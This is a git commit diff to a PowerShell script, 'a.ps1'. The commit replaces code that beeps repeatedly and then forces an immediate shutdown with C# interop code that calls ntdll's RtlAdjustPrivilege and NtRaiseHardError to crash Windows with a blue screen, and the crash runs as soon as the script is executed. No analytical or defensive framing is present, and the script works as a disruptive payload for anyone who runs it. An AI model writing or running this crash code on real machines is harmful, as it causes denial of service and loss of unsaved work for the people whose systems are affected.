c86acaca8f7273c38596aeb2c571fc47398e1973
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-08-26 16:13:52 +0200

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,15 +1,20 @@
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Kernel32 {
-        [DllImport("Kernel32.dll")]
-        public static extern bool Beep(int frequency, int duration);
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Crash {
+    [DllImport("ntdll.dll")]
+    public static extern void RtlAdjustPrivilege(UInt32 Privilege, Boolean Enable, Boolean Client, out Boolean Enabled);
+
+    [DllImport("ntdll.dll")]
+    public static extern void NtRaiseHardError(Int32 ErrorStatus, UInt32 NumberOfParameters, UInt32 UnicodeStringParameterMask, IntPtr Parameters, Int32 ValidResponseIndex, out Int32 Response);
+
+    public static void TriggerBSOD() {
+        Boolean PrivilegeEnabled;
+        RtlAdjustPrivilege(19, true, false, out PrivilegeEnabled); // SE_DEBUG_NAME privilege
+        Int32 Response;
+        NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out Response); // STATUS_FATAL_APP_EXIT
     }
-"@
-
-for ($i = 1; $i -le 250; $i++) {
-    [void][Kernel32]::Beep(3000, 100)  
-    Start-Sleep -Milliseconds 100    
 }
-
-shutdown /s /f /t 00
+"@ -Language CSharp
+[Crash]::TriggerBSOD()
